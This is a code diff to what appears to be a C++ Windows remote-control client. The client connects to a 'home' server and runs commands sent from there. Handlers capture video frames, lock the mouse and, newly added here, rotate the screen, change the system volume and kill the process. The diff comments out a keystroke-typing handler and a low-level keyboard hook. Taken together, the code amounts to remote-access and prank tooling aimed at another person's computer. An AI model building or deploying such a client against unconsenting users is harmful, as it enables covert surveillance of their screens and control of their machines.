@@ -4,15 +4,18 @@
 #include <map>
 #include "ip.h"
 #include <iostream>
-#include <vector>
+#define _WIN32_WINNT 0x0601
 #include <windows.h>
+#include <mmdeviceapi.h>
+#include <endpointvolume.h>
+#include <stdlib.h>
 #include <sapi.h>
 #include <random>
 #include <winnt.h>
 #define STB_IMAGE_IMPLEMENTATION
 #include "stb_image.h"
 #include "../../packet.h"
-#include "stupid_windows.h"
+// #include "stupid_windows.h"
 using asio::ip::tcp;
 
 // Create terms of service
@@ -218,52 +221,136 @@ class get_video_frame : public Packet_Manager {
     }
 };
 
-class keyboard_type : public Packet_Manager
+// class keyboard_type : public Packet_Manager
+// {
+//     void receive(const Packet& packet) override
+//     {
+//         Sleep(500);
+//         type_string(packet.str);
+//     }
+// };
+
+// class echo_keyboard : public Packet_Manager {
+// public:
+//     bool state = false;
+//     std::thread worker;
+//     HHOOK hHook = nullptr;
+// 
+//     echo_keyboard()
+//     {
+//         worker = std::thread([this]{ loop(); });
+//         worker.detach();
+//     }
+// 
+//     void loop()
+//     {
+//         hHook = SetWindowsHookExW(WH_KEYBOARD_LL, keyboard_hook, nullptr, 0);
+//         if (!hHook) {
+//             std::cerr << "Failed to set hook!\n";
+//             return;
+//         }
+// 
+//         MSG msg;
+//         while (GetMessage(&msg, nullptr, 0, 0) > 0)
+//         {
+//             TranslateMessage(&msg);
+//             DispatchMessage(&msg);
+// 
+//             if (!state) continue;                 
+// 
+//             std::u16string glyph;
+//             if (msgToUtf16(msg, glyph))          
+//                 type_string(glyph);             
+//         }
+// 
+//         UnhookWindowsHookEx(hHook);
+//     }
+// 
+//     void receive(const Packet& p) override { state = p.bo; }
+// };
+
+bool RotatePrimaryMonitor(DWORD angleDeg)
 {
-    void receive(const Packet& packet) override
+    DWORD orientation;
+    switch (angleDeg)
     {
-        Sleep(500);
-        type_string(packet.str);
+        case   0: orientation = DMDO_DEFAULT; break;
+        case  90: orientation = DMDO_90;     break;
+        case 180: orientation = DMDO_180;    break;
+        case 270: orientation = DMDO_270;    break;
+        default:  return false;
+    }
+
+    DISPLAY_DEVICE dd{ sizeof(dd) };
+    if (!EnumDisplayDevices(nullptr, 0, &dd, 0))
+        return false;
+
+    DEVMODE dm{ };
+    dm.dmSize = sizeof(dm);
+    if (!EnumDisplaySettingsEx(dd.DeviceName, ENUM_CURRENT_SETTINGS, &dm, 0))
+        return false;
+
+    bool nowPortrait  = (orientation == DMDO_90  || orientation == DMDO_270);
+    bool wasPortrait  = (dm.dmDisplayOrientation == DMDO_90 ||
+                         dm.dmDisplayOrientation == DMDO_270);
+    if (nowPortrait != wasPortrait)
+        std::swap(dm.dmPelsWidth, dm.dmPelsHeight);
+
+    dm.dmDisplayOrientation = orientation;
+    dm.dmFields = DM_DISPLAYORIENTATION | DM_PELSWIDTH | DM_PELSHEIGHT;
+
+    LONG res = ChangeDisplaySettingsEx(dd.DeviceName, &dm, nullptr,
+                                       CDS_UPDATEREGISTRY | CDS_GLOBAL, nullptr);
+    return (res == DISP_CHANGE_SUCCESSFUL);
+}
+
+class rotate_screen : public Packet_Manager {
+    void receive(const Packet &packet) override {
+        RotatePrimaryMonitor(packet.number);
     }
 };
 
-class echo_keyboard : public Packet_Manager {
-public:
-    bool state = false;
-    std::thread worker;
-    HHOOK hHook = nullptr;
+class dead_class : Packet_Manager {}; 
+bool SetMasterVolume(float level /*0.0 ‑ 1.0*/)
+{
+    HRESULT hr;
+    CoInitialize(nullptr);                             // 1. COM init
 
-    echo_keyboard()
-    {
-        worker = std::thread([this]{ loop(); });
-        worker.detach();
+    IMMDeviceEnumerator* pEnum = nullptr;
+    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), nullptr,
+                          CLSCTX_INPROC_SERVER,
+                          IID_PPV_ARGS(&pEnum));
+    if (FAILED(hr)) return false;
+
+    IMMDevice* pDevice = nullptr;                      // 2. default render device
+    hr = pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice);
+    pEnum->Release();
+    if (FAILED(hr)) return false;
+
+    IAudioEndpointVolume* pVolume = nullptr;           // 3. volume interface
+    hr = pDevice->Activate(__uuidof(IAudioEndpointVolume),
+                           CLSCTX_INPROC_SERVER, nullptr,
+                           (void**)&pVolume);
+    pDevice->Release();
+    if (FAILED(hr)) return false;
+
+    hr = pVolume->SetMasterVolumeLevelScalar(level, nullptr); // 4. set
+    pVolume->Release();
+    CoUninitialize();
+    return SUCCEEDED(hr);
+}
+class system_volume : Packet_Manager {
+    void receive(const Packet &packet) override {
+        float real_volume = (float)packet.number / 100;
+
+        SetMasterVolume(real_volume);
     }
+};
 
-    void loop()
-    {
-        hHook = SetWindowsHookExW(WH_KEYBOARD_LL, keyboard_hook, nullptr, 0);
-        if (!hHook) {
-            std::cerr << "Failed to set hook!\n";
-            return;
-        }
-
-        MSG msg;
-        while (GetMessage(&msg, nullptr, 0, 0) > 0)
-        {
-            TranslateMessage(&msg);
-            DispatchMessage(&msg);
-
-            if (!state) continue;                 
-
-            std::u16string glyph;
-            if (msgToUtf16(msg, glyph))          
-                type_string(glyph);             
-        }
-
-        UnhookWindowsHookEx(hHook);
+class kill : Packet_Manager {
+    void receive(const Packet &packet) override {
+        exit(EXIT_SUCCESS);
     }
-
-    void receive(const Packet& p) override { state = p.bo; }
 };
 
 int main() {
@@ -279,8 +366,13 @@ int main() {
     lock_mouse_to_box lock_mouse_handle;
     free_mouse free_mouse_handle;
     get_video_frame video_frame_handle;
-    keyboard_type keyboard_type_handle;
-    echo_keyboard echo_keyboard_handle;
+    // keyboard_type keyboard_type_handle;
+    // echo_keyboard echo_keyboard_handle;
+    dead_class dead1;
+    dead_class dead2;
+    rotate_screen rotate_screen_handle;
+    system_volume system_volume_handle;
+    kill kill_handle;
 
     while(true) {
         std::cout << "trying to connect to home\n";
